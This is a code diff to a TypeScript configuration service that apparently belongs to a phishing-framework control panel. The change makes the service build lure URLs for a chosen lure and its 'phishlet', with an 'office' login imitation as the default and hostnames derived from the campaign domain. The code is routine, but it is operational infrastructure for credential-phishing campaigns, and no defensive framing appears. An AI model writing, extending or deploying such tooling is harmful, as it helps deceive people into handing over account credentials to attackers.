@@ -265,10 +265,11 @@ export class ConfigService {
     }
   }
 
-  public async getFullLink(): Promise<{
+  public async getFullLink(lureId?: string): Promise<{
     fullUrl: string;
     domain: string;
     path: string;
+    phishlet?: string;
   } | null> {
     try {
       const config = await this.readConfig();
@@ -278,13 +279,34 @@ export class ConfigService {
       const general = config.general || {};
       const domain = general.domain || "";
       const lures = config.lures || [];
-      const path = lures[0]?.path || "";
-      const fullUrl = domain ? `https://office.${domain}${path}` : "";
+
+      // Find the specific lure if a lureId is provided
+      let selectedLure;
+      if (lureId) {
+        selectedLure = lures.find((lure) => lure.id === lureId);
+      }
+
+      // Fall back to the first lure if none found or no ID specified
+      const lure = selectedLure || lures[0] || {};
+      const path = lure.path || "";
+      const phishlet = lure.phishlet || "office"; // Default to office if not specified
+
+      // Get the phishlet configuration to determine the correct hostname
+      const phishletConfig = config.phishlets?.[phishlet] || {};
+
+      // Use the phishlet's hostname or construct it if not explicitly set
+      let hostname = phishletConfig.hostname || "";
+      if (!hostname && domain) {
+        hostname = `${phishlet}.${domain}`;
+      }
+
+      const fullUrl = hostname ? `https://${hostname}${path}` : "";
 
       return {
         fullUrl,
         domain,
         path: path.replace(/^\/+/, ""), // Remove leading slash for display
+        phishlet,
       };
     } catch (error) {
       console.error("Error getting full link:", error);
